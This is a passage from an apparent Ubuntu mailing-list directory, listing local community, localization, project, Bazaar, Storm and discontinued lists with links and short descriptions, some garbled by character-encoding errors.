  Discussion list for Ubuntu Nepal
* [ubuntu-nz](http://lists.ubuntu.com/mailman/listinfo/ubuntu-nz) -
  Advocacy and discussion about Ubuntu in New Zealand
* [ubuntu-pa](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-pa) -
  Ubuntu PanamÃ¡
* [ubuntu-pe](http://lists.ubuntu.com/mailman/listinfo/ubuntu-pe) -
  Ubuntu Peruvian LoCo Team
* [ubuntu-pg](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-pg) -
  Papua New Guinea Ubuntu Users
* [ubuntu-ph](http://lists.ubuntu.com/mailman/listinfo/ubuntu-ph) -
  Mailing List para sa Ubuntu Pilipinas (Philippines)
* [ubuntu-pk](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-pk) -
  Ubuntu-Linux Pakistan Team
* [ubuntu-pl](http://lists.ubuntu.com/mailman/listinfo/ubuntu-pl) -
  Polska lista dyskusyjna uÂ¿ytkownikÃ³w Ubuntu
* [ubuntu-pr](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-PR) -
  Equipo Puerto Rico "LoCo" de Ubuntu
* [ubuntu-ps](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ps) -
  Ø§ÙÙØ§Ø¦ÙØ© Ø§ÙØ¨Ø±ÙØ¯ÙØ© ÙÙØ±ÙÙ Ø£ÙØ¨ÙØªÙ Ø§ÙÙÙØ³Ø·ÙÙÙ
* [ubuntu-pt](http://lists.ubuntu.com/mailman/listinfo/ubuntu-pt) -
  Lista de DiscussÃ£o sobre o Ubuntu
* [ubuntu-qa](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-qa) -
  Ubuntu Qatar
* [ubuntu-quebec](http://lists.ubuntu.com/mailman/listinfo/ubuntu-quebec) -
  Ubuntu QuÃ©bec
* [ubuntu-ro](http://lists.ubuntu.com/mailman/listinfo/ubuntu-ro) -
  Lista de discutii a echipei Ubuntu RomÃ¢nia
* [ubuntu-rs](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-rs) -
  Ubuntu Serbia Local Community Team
* [ubuntu-ru](http://lists.ubuntu.com/mailman/listinfo/ubuntu-ru) -
  Mailing list for Russian-speaking Ubuntu users
* [ubuntu-sd](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-sd) -
  Ubuntu Sudan
* [ubuntu-se](http://lists.ubuntu.com/mailman/listinfo/ubuntu-se) -
  Ubuntu Sverige
* [ubuntu-sg](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-SG) -
  The Singapore Ubuntu Team
* [ubuntu-si](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-si) -
  Ubuntu Slovenija
* [ubuntu-sn](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-sn) -
  Ubuntu Senegal
* [ubuntu-sv](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-sv) -
  Ubuntu El Salvador
* [ubuntu-sy](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-sy) -
  Ubuntu Syria Mailist
* [ubuntu-tam](http://lists.ubuntu.com/mailman/listinfo/ubuntu-tam) -
  உபுண்டு பயனர் மடலாடற் குழு - தமிழகம்
* [ubuntu-tn](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-tn) -
  Ubuntu Tunisian LoCo Team Mailing List
* [ubuntu-tr](http://lists.ubuntu.com/mailman/listinfo/ubuntu-tr) -
  Ubuntu Turkiye Users and Developers List
* [ubuntu-tt](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-tt) -
  Trinidad and Tobago Loco Team
* [ubuntu-tw](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-TW) -
  Ubuntu Taiwan LoCo Team
* [ubuntu-tz](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-tz) -
  Ubuntu LocoTeam in Tanzania
* [ubuntu-ua](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ua) -
  Ubuntu Ukraine
* [ubuntu-ug](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ug) -
  Ubuntu Uganda
* [ubuntu-uk](http://lists.ubuntu.com/mailman/listinfo/ubuntu-uk) -
  UK Ubuntu Talk
* [ubuntu-us](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us) -
  US LoCo Teams
* [ubuntu-us-ak](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ak) -
  The Alaska Ubuntu Local Community Mailing List
* [ubuntu-us-al](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-al) -
  Alabama LoCo Team
* [ubuntu-us-ar](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ar) -
  Ubuntu US Arkansas
* [ubuntu-us-az](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-az) -
  The mailing list for Ubuntu-Arizona LoCo Team
* [ubuntu-us-ca](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ca) -
  Ubuntu US California
* [ubuntu-us-chicago](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-chicago) -
  Ubuntu Chicago Local Community Team Mailing List
* [ubuntu-us-co](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-co) -
  Ubuntu Colorado Local Community Team
* [ubuntu-us-ct](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ct) -
  Ubuntu Connecticut Local Community Team
* [ubuntu-us-dc](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-dc) -
  Ubuntu US District of Columbia
* [ubuntu-us-eastcoast](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-eastcoast) -
  Ubuntu US East Coast
* [ubuntu-us-fl](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-fl) -
  Mailing list for Ubuntu Florida LoCo Team
* [ubuntu-us-ga](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ga) -
  Georgia Ubuntu Mailing List
* [ubuntu-us-ia](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-US-IA) -
  Ubuntu Iowa Team
* [ubuntu-us-id](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-id) -
  Ubuntu US Idaho
* [ubuntu-us-il](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-il) -
  Ubuntu Illinois Local Community Team Mailing List
* [ubuntu-us-in](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-in) -
  Ubuntu's Indiana Local Community Team
* [ubuntu-us-ks](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ks) -
  Kansas Ubuntu Users Mailing List
* [ubuntu-us-ky](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ky) -
  Kentucky LoCo Team mailing list
* [ubuntu-us-la](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-la) -
  Ubuntu Louisiana Local Community Team
* [ubuntu-us-ma](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ma) -
  Ubuntu Massachusetts Local Community Team
* [ubuntu-us-md](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-md) -
  Ubuntu Maryland Loco Team
* [ubuntu-us-me](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-me) -
  Ubuntu Maine-iacs LoCo Team list
* [ubuntu-us-mi](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-mi) -
  Ubuntu Michigan Local Community Team
* [ubuntu-us-mn](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-mn) -
  Ubuntu Minnesota Local Community Team
* [ubuntu-us-mo](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-mo) -
  Ubuntu Missouri Team
* [ubuntu-us-ms](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-US-MS) -
  Mailing List for the Mississippi Ubuntu LoCo Team
* [ubuntu-us-nc](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-nc) -
  Ubuntu North Carolina Local Community Team
* [ubuntu-us-nd](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-nd) -
  Ubuntu North Dakota Local Community Team
* [ubuntu-us-ne](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ne) -
  Ubuntu Nebraska Local Community Team
* [ubuntu-us-nh](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-US-NH) -
  Ubuntu New Hampshire LoCo Team
* [ubuntu-us-nj](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-nj) -
  Mailing list for the Ubuntu New Jersey LoCo Team
* [ubuntu-us-nm](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-nm) -
  Ubuntu US New Mexico LoCo Team
* [ubuntu-us-nv](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-nv) -
  Ubuntu Nevada Local Community Team
* [ubuntu-us-oh](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-oh) -
  Ubuntu Ohio
* [ubuntu-us-ok](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ok) -
  Oklahoma LoCo list
* [ubuntu-us-or](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-or) -
  Ubuntu Oregon LoCo Team
* [ubuntu-us-pa](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-pa) -
  Ubuntu has got a friend in Pennsylvania
* [ubuntu-us-pnw](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-pnw) -
  Ubuntu- PNWTeam
* [ubuntu-us-ri](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-ri) -
  Ubuntu Rhode Island Local Community Team
* [ubuntu-us-sc](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-sc) -
  Ubuntu US - South Carolina
* [ubuntu-us-sd](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-sd) -
  Ubuntu South Dakota LoCo Team
* [ubuntu-us-tn](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-US-TN) -
  Ubuntu Tennessee LoCo Team
* [ubuntu-us-tx](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-tx) -
  Ubuntu Texas Local Community Team
* [ubuntu-us-tx-dallas](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-tx-dallas) -
  Ubuntu DallasTeam Mailing List
* [ubuntu-us-ut](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-ut) -
  Ubuntu Utah Local Community Team
* [ubuntu-us-va](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-va) -
  Ubuntu US Virginia
* [ubuntu-us-vt](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-vt) -
  Ubuntu Vermont Local Community Team
* [ubuntu-us-wa](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-wa) -
  Ubuntu Washington State Local Community List
* [ubuntu-us-wi](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-wi) -
  Ubuntu US Wisconsin Local Community Team
* [ubuntu-us-wv](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-wv) -
  Ubuntu West Virginia Local Community Team
* [ubuntu-uy](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-uy) -
  Grupo de usuarios de Ubuntu Linux del Uruguay
* [ubuntu-ve](http://lists.ubuntu.com/mailman/listinfo/ubuntu-ve) -
  Ubuntu de Venezuela
* [ubuntu-vn](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-VN) -
  Ubuntu VN
* [ubuntu-za](http://lists.ubuntu.com/mailman/listinfo/ubuntu-za) -
  Ubuntu South African Local Community
* [ubuntu-zh](http://lists.ubuntu.com/mailman/listinfo/ubuntu-zh) -
  ubuntu-zh mailing lists
* [ubuntu-zm](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-zm) -
  Ubuntu Zambia
* [ubuntu-zw](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-zw) -
  Zimbabwe Local Team
* [kubuntu-de](http://lists.ubuntu.com/mailman/listinfo/kubuntu-de) -
  Deutschsprachige Kubuntu Community Mailingliste
* [loco-contacts](http://lists.ubuntu.com/mailman/listinfo/loco-contacts) -
  Ubuntu local community team (LoCo) contacts
* [locoteams-dev](http://lists.ubuntu.com/mailman/listinfo/locoteams-dev) -
  discussing code that helps LoCoTeams prosper

## Localization Lists

* [ubuntu-es-l10n](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-es-l10n) -
  Lista de coordinaciÃ³n del equipo de traducciÃ³n al espaÃ±ol de Ubuntu
* [ubuntu-fr-l10n](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-fr-l10n) -
  Liste pour la coordination de l'Ã©quipe francophone de traduction d'Ubuntu
* [ubuntu-l10n-am](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-am) -
  Ubuntu Amharic Translation and user
* [ubuntu-l10n-amh](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-amh) -
  Ubuntu Amharic translation
* [ubuntu-l10n-ara](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-ara) -
  Arabic translators list - القائمة البريدية لترجمة أوبونتو العربية
* [ubuntu-l10n-arn](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-arn) -
  Ubuntu Mapudungun Translation
* [ubuntu-l10n-ast](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-ast) -
  Ubuntu Asturian Translators
* [ubuntu-l10n-bel](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-bel) -
  Ubuntu Belarusian Translation
* [ubuntu-l10n-ben](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-ben) -
  Ubuntu Bengali Translation
* [ubuntu-l10n-ca](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-ca) -
  Ubuntu Catalan Translators list -- Llista de traducció de l'Ubuntu al català
* [ubuntu-l10n-eng](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-eng) -
  A list for English translations
* [ubuntu-l10n-est](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-est) -
  Ubuntu Estonian translators
* [ubuntu-l10n-eus](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-eus) -
  Ubuntu Basque translators list
* [ubuntu-l10n-fas](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-fas) -
  Ubuntu Persian Translation (ترجمهٔ فارسی اوبونتو)
* [ubuntu-l10n-fin](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-fin) -
  Ubuntu Finnish translators (Ubuntun suomentajaryhmä)
* [ubuntu-l10n-gl](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-gl) -
  List for coordination of Ubuntu Galician translation team
* [ubuntu-l10n-guc](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-guc) -
  Ubuntu Wayuunaiki Translation discussion
* [ubuntu-l10n-he](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-he) -
  Ubuntu Hebrew Translation
* [ubuntu-l10n-hu](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-hu) -
  List for coordination of Ubuntu Hungarian translation team
* [ubuntu-l10n-ie](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-ie) -
  Ubuntu Irish Translation Team
* [ubuntu-l10n-it](http://lists.ubuntu.com/mailman/listinfo/ubuntu-l10n-it) -
  Mailing list del gruppo di traduzione italiano
* [ubuntu-l10n-kir](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-kir) -
  Ubuntu Kirghiz Translation
* [ubuntu-l10n-ko](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-ko) -
  Ubuntu Korean Translators
* [ubuntu-l10n-kur](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-kur) -
  Listeya wergerandina Ubuntu bi kurdi
* [ubuntu-l10n-kw](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-kw) -
  Cornish translation team
* [ubuntu-l10n-lao](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-lao) -
* [ubuntu-l10n-lin](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-lin) -
  Ubuntu Lingala Translation
* [ubuntu-l10n-mal](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-mal) -
  Ubuntu Malayalam Translation
* [ubuntu-l10n-mar](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-mar) -
  List for coordination of Ubuntu Marathi translation team
* [ubuntu-l10n-mhr](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-mhr) -
  Translating Ubuntu to Meadow Mari
* [ubuntu-l10n-miq](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-miq) -
  Ubuntu Miskito Translators
* [ubuntu-l10n-mlg](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-mlg) -
  Ubuntu Malagasy Translators
* [ubuntu-l10n-my](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-my) -
  Ubuntu Burmese Translators List
* [ubuntu-l10n-nds](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-nds) -
* [ubuntu-l10n-nl](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-nl) -
  Dutch Translations for Ubuntu
* [ubuntu-l10n-oci](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-oci) -
  CÃ²la de revirada en occitan d'Ubuntu
* [ubuntu-l10n-oji](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-oji) -
  Ubuntu Ojibwe Translators
* [ubuntu-l10n-ori](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-ori) -
* [ubuntu-l10n-ptbr](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-ptbr) -
  Brazilian translators list
* [ubuntu-l10n-que](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-que) -
* [ubuntu-l10n-ru](http://lists.ubuntu.com/mailman/listinfo/ubuntu-l10n-ru) -
  List for coordination of Ubuntu Russian translation team
* [ubuntu-l10n-shs](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-shs) -
  Discussing Ubuntu Secwepemctsín L10N
* [ubuntu-l10n-slo](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-slo) -
* [ubuntu-l10n-swa](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-swa) -
  Ubuntu Swahili Tranlators Team mailing list.
* [ubuntu-l10n-tam](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-tam) -
  உபுண்டு தமிழாக்க மடலாடற் குழு
* [ubuntu-l10n-tha](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-tha) -
  Ubuntu Thai Translation
* [ubuntu-l10n-tib](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-tib) -
* [ubuntu-l10n-urd](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-urd) -
  Ubuntu Urdu Translation
* [ubuntu-l10n-wol](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-wol) -
  Ubuntu Wolof translation team
* [ubuntu-l10n-yid](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-yid) -
  Yiddish translation team (ubuntu-l10n-yi)
* [ubuntu-l10n-zh](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-zh) -
* [ubuntu-pl-l10n](http://lists.ubuntu.com/mailman/listinfo/ubuntu-pl-l10n) -
  List for coordination of Ubuntu Polish translation team

The mailing list laptop-testing-team could not be found!
The mailing list juju could not be found!
The mailing list juju-dev could not be found!
## Other Ubuntu Projects and Groups

* [free-software-laptop](http://lists.ubuntu.com/mailman/listinfo/free-software-laptop) -
  Laptops that work well with pure Free Software drivers and OpenBIOS
* [ubuntu-accessibility](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-accessibility) -
  mailing list of the accessibility team
* [ubuntu-advantage](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-Advantage) -
  For Ubuntu Advantage customers only - run by Canonical Support
* [ubuntu-arabic](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-arabic) -
  Ubuntu-Arabic team
* [ubuntu-art](http://lists.ubuntu.com/mailman/listinfo/ubuntu-art) -
  Discussion on Ubuntu artwork
* [ubuntu-ast](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ast) -
  ComunidÃ¡ Asturiana d'Ubuntu
* [ubuntu-backports](http://lists.ubuntu.com/mailman/listinfo/ubuntu-backports) -
  Backports Discussion
* [ubuntu-bj-ctn](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-bj-ctn) -
  Cotonou, Benin LoCo team
* [ubuntu-bluetooth](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-bluetooth) -
  Discussion about Bluetooth on Ubuntu
* [ubuntu-br-council](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-br-council) -
* [ubuntu-burning](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-burning) -
  Mailing list for the ubuntu burning team
* [ubuntu-cat](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-cat) -
  Ubuntu Catalan mailing list
* [ubuntu-classroom-es](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-classroom-es) -
  Ubuntu Classroom project in Spanish
* [ubuntu-cloud](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-cloud) -
  Discussions about Ubuntu Cloud
* [ubuntu-community-team](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-community-team) -
  A place where organisers (not necessarily developers) in our community discuss upcoming events, initiatives, get help and hang out.
* [ubuntu-core-marketing](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-core-marketing) -
  Ubuntu Core Marketing Team List
* [ubuntu-cym](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-cym) -
  Ubuntu Cymru / Wales LoCo Talk
* [ubuntu-dct](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-DCT) -
  Debian Collaboration Team
* [ubuntu-directory](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-directory) -
  Ubuntu Directory Team
* [ubuntu-doc](http://lists.ubuntu.com/mailman/listinfo/ubuntu-doc) -
  Documentation team coordination and discussion
* [ubuntu-doc-spa](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-doc-spa) -
  DocumentaciÃ³n de Ubuntu en espaÃ±ol
* [ubuntu-education](http://lists.ubuntu.com/mailman/listinfo/ubuntu-education) -
  Education topics across any Ubuntu product
* [ubuntu-flavors](http://lists.ubuntu.com/mailman/listinfo/ubuntu-flavors) -
  Cross-flavor discussion
* [ubuntu-gal](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-gal) -
* [ubuntu-gnome](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-GNOME) -
  Ubuntu GNOME Coordination and Discussion
* [ubuntu-hardened](http://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened) -
  Ubuntu security discussion
* [ubuntu-in-dl](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-in-dl) -
  Ubuntu Delhi Loco Team List
* [ubuntu-in-gj](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-in-gj) -
  Ubuntu India - Gujarat
* [ubuntu-in-tn](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-in-tn) -
  UBUNTU IN TAMILNADU INDIA
* [ubuntu-installer](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-installer) -
  Ubuntu installer development
* [ubuntu-irc](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-irc) -
  Ubuntu IRC issues discussion list
* [ubuntu-java](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-java) -
* [ubuntu-jobs](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-jobs) -
  ANNOUNCE of Ubuntu related jobs
* [ubuntu-leadership](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-leadership) -
  ubuntu-leadership
* [ubuntu-membership-boards](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-membership-boards) -
* [ubuntu-mirrors](http://lists.ubuntu.com/mailman/listinfo/ubuntu-mirrors) -
  Announcements, feedback and discussion for Ubuntu mirror maintainers
* [ubuntu-mono](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-mono) -
  Packaging Mono for Ubuntu
* [ubuntu-motu-p2p](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-motu-p2p) -
* [ubuntu-motu-science](http://lists.ubuntu.com/mailman/listinfo/ubuntu-motu-science) -
  development and discussion of Science applications in Ubuntu
* [ubuntu-mx-df](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-mx-df) -
* [ubuntu-mythtv](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-mythtv) -
  Ubuntu's MythTV & Mythbuntu teams
* [ubuntu-news-team](http://lists.ubuntu.com/mailman/listinfo/ubuntu-news-team) -
  Submit and discuss any Ubuntu related news stories
* [ubuntu-news-translations](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-news-translations) -
  Ubuntu Weekly News Translation Team
* [ubuntu-nordic](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-nordic) -
  Ubuntu Nordic
* [ubuntu-patch-reviews](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-patch-reviews) -
  Ubuntu patch reviews list
* [ubuntu-platform](http://lists.ubuntu.com/mailman/listinfo/ubuntu-platform) -
  Ubuntu Platform
* [ubuntu-reviews](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-reviews) -
  Discussion of Ubuntu merge proposals
* [ubuntu-screencasts](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-screencasts) -
  Ubuntu screencast team list
* [ubuntu-scribes](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-scribes) -
  Help augment and enhance the archival of Ubuntu community meetings and events.
* [ubuntu-security-patch](http://lists.ubuntu.com/mailman/listinfo/ubuntu-security-patch) -
  Ubuntu Security Patch Announcements
* [ubuntu-server-arm](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-server-arm) -
* [ubuntu-soc](http://lists.ubuntu.com/mailman/listinfo/ubuntu-soc) -
  Discussion list for Ubuntu participants in the Google Summer of Code programme
* [ubuntu-sponsors](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-sponsors) -
* [ubuntu-students](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-students) -
  Ubuntu students Mailing list.
* [ubuntu-sugarteam](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-sugarteam) -
  Sugar Learning Environment for Ubuntu
* [ubuntu-telepathy](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-telepathy) -
  Discussion about Telepathy on Ubuntu
* [ubuntu-translators](http://lists.ubuntu.com/mailman/listinfo/ubuntu-translators) -
  Discussion about translating Ubuntu
* [ubuntu-women](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-Women) -
  Ubuntu-Women
* [ubuntu-x](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-x) -
  Discussion of improving X stability and performance on Ubuntu
* [ubuntustudio-testing](http://lists.ubuntu.com/mailman/listinfo/ubuntustudio-testing) -

## Bazaar-related Lists

* [bazaar](http://lists.ubuntu.com/mailman/listinfo/bazaar) -
  bazaar discussion
* [bazaar-announce](http://lists.ubuntu.com/mailman/listinfo/bazaar-announce) -
  Announcements for the Bazaar project
* [bazaar-commits](http://lists.ubuntu.com/mailman/listinfo/bazaar-commits) -
  Bazaar repository commit notification

## Storm Lists

* [storm](http://lists.ubuntu.com/mailman/listinfo/storm) -
  Discussion of the Storm Object Relational Mapper for the Python Language

## Discontinued (Historical) Lists

* [karmic-changes](http://lists.ubuntu.com/mailman/listinfo/karmic-changes) -
  Karmic Koala archive upload notification list
* [jaunty-changes](http://lists.ubuntu.com/mailman/listinfo/jaunty-changes) -
  Jaunty Jackalope archive upload notification list
* [intrepid-changes](http://lists.ubuntu.com/mailman/listinfo/intrepid-changes) -
  Intrepid Ibex archive upload notification list
* [dapper-changes](http://lists.ubuntu.com/mailman/listinfo/dapper-changes) -
  DapperDrake archive upload notification list
* [breezy-changes](http://lists.ubuntu.com/mailman/listinfo/breezy-changes) -
  BreezyBadger archive upload notification list [Historical]
* [hoary-changes](http://lists.ubuntu.com/mailman/listinfo/hoary-changes) -
  HoaryHedgehog archive upload notification list [Historical]
* [motu-council](http://lists.ubuntu.com/mailman/listinfo/motu-council) -
  [OBSOLETE] administrative list for motu-council, also handles motu new developer applications.
* [rosetta-users](http://lists.ubuntu.com/mailman/listinfo/rosetta-users) -
  This list is CLOSED, please use launchpad-users instead
* [sounder](http://lists.ubuntu.com/mailman/listinfo/sounder) -
  [OBSOLETE] Ubuntu community random chit-chat list
* [team-council-members](http://lists.ubuntu.com/mailman/listinfo/team-council-members) -
  [OBSOLETE] Please go to http://launchpad.net/~ubuntu-council-teams instead
* [ubuntu-changes-auto](http://lists.ubuntu.com/mailman/listinfo/ubuntu-changes-auto) -
  Archive upload notification list, for automated uploads to all Ubuntu releases
* [ubuntu-classroom](http://lists.ubuntu.com/mailman/listinfo/ubuntu-classroom) -
  Ubuntu Classroom Management
* [ubuntu-event-planners](http://lists.ubuntu.com/mailman/listinfo/ubuntu-event-planners) -
  Ubuntu Event Planners
* [ubuntu-motu-mentors](http://lists.ubuntu.com/mailman/listinfo/ubuntu-motu-mentors) -
  [OBSOLETE] MOTU Mentoring happens here
* [ubuntu-mozillateam](http://lists.ubuntu.com/mailman/listinfo/ubuntu-mozillateam) -
  Ubuntu Mozilla packaging team
* [ubuntu-mozillateam-bugs](http://lists.ubuntu.com/mailman/listinfo/ubuntu-mozillateam-bugs) -
  Ubuntu Mozilla bugs
* [ubuntu-universe-sponsors](http://lists.ubuntu.com/mailman/listinfo/ubuntu-universe-sponsors) -
  [OBSOLETE] List for sponsors for Master of the Universe
* [warty-changes](http://lists.ubuntu.com/mailman/listinfo/warty-changes) -
  WartyWarthog archive upload notification list [Historical]
* [gutsy-changes](http://lists.ubuntu.com/mailman/listinfo/gutsy-changes) -
